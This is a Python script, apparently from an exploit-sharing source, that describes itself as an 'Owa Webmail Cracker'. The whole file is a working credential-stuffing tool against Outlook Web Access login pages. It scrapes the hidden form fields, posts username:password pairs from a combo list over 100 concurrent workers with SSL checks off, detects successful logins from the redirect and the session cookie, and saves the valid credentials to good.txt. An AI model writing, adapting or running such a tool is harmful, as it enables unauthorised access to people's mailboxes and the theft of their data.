import asyncio
from aiohttp import ClientSession
from bs4 import BeautifulSoup
import click
from urllib.parse import urljoin

class OWACheck:
    def __init__(self, url_file: str, pass_file: str, threads: int = 100) -> None:
        self.url_file = url_file
        self.pass_file = pass_file
        self.threads = threads

        self.stat = {
            'good': 0,
            'bad': 0,
            'REFRESH': 0
        }

    async def save_res(self, where: str, what: str) -> None:
        if where == 'good':
            with open(f'{where}.txt', 'a', encoding='utf-8') as rez:
                rez.write(f'{what}\n')

    async def __lazy_read(self) -> tuple:
        url_queue = asyncio.Queue()
        with open(self.url_file, 'r', encoding='latin-1') as f:
            for line in f:
                await url_queue.put(line.strip())

        pass_queue = asyncio.Queue()
        with open(self.pass_file, 'r', encoding='latin-1') as f:
            for line in f:
                username_password = line.strip().split(':', 1)
                if len(username_password) == 2:
                    await pass_queue.put((username_password[0], username_password[1]))
                else:
                    print(f"Ignoring invalid line in pass file: {line.strip()}")

        return url_queue, pass_queue

    async def __get_combo(self) -> tuple:
        try:
            url = await self.url_queue.get()
            username, password = await self.pass_queue.get()
            return url, username, password
        except asyncio.QueueEmpty:
            return None

    def __parse_fields_data(self, page_html: str) -> dict:
        data = {}

        soup = BeautifulSoup(page_html, 'html.parser')
        form = soup.find("form", {"name": "logonForm"})

        if not form:
            return data

        for field in form.find_all('input', {'type': 'hidden'}):
            data[field.get('name', '')] = field.get('value', '')

        return data

    def __check_resp(self, headers: dict) -> bool:
        if 'auth/logon.aspx' in headers.get('Location', ''):
            return False
        if not str(headers.get('Location', '')).endswith('/owa'):
            return False
        if 'cadata' not in headers.get('Set-Cookie', ''):
            return False

        return True

    async def __update_stat(self, what: str, data: str) -> None:
        self.stat[what] += 1
        await self.save_res(what, data)
        self.print_status()

    def print_status(self) -> None:
        click.clear()
        for k, v in self.stat.items():
            if k == 'good':
                color = 'green'
            elif k == 'bad':
                color = 'red'
            elif k == 'REFRESH':
                color = 'yellow'
            else:
                color = 'white'
            click.echo(f"{k.upper()}: {click.style(str(v), fg=color)}")

    async def thread(self) -> None:
        while True:
            combo = await self.__get_combo()
            if not combo:
                break

            url, username, password = combo
            data = {
                "username": username,
                "password": password
            }
            defargs = {
                'verify_ssl': False,
                'allow_redirects': False,
                'timeout': 20
            }

            try:
                url, *rest = url.split('/owa/')
            except Exception as e:
                print('[!?] Something new:', url, '; err:', e)
                return

            async with ClientSession() as session:
                try:
                    async with session.get(urljoin(url, '/owa/auth/logon.aspx'), **defargs) as r:
                        if r.status != 200:
                            await self.__update_stat('REFRESH', f'{url};{username};{password}')
                            return

                        data.update(self.__parse_fields_data(await r.text()))

                    async with session.post(urljoin(url, '/owa/auth.owa'), data=data, **defargs) as r:
                        if r.status != 302:
                            await self.__update_stat('REFRESH', f'{url};{username};{password}')
                            return

                        if self.__check_resp(r.headers):
                            await self.__update_stat('good', f'{url};{username};{password}')
                        else:
                            await self.__update_stat('bad', f'{url};{username};{password}')
                except Exception:
                    await self.__update_stat('REFRESH', f'{url};{username};{password}')

    async def run_threads(self) -> None:
        self.url_queue, self.pass_queue = await self.__lazy_read()  # Assign iter here
        tasks = []

        for _ in range(self.threads):
            tasks.append(asyncio.create_task(self.thread()))

        await asyncio.gather(*tasks)

async def main():
    click.echo("@exploitsdotcs Owa Webmail Cracker")
    click.echo("------------------------------")
    url_file = input("Put your url: ")
    pass_file = input("Put your username/email:password list: ")
    checker = OWACheck(url_file, pass_file)
    await checker.run_threads()

if __name__ == '__main__':
    asyncio.run(main())
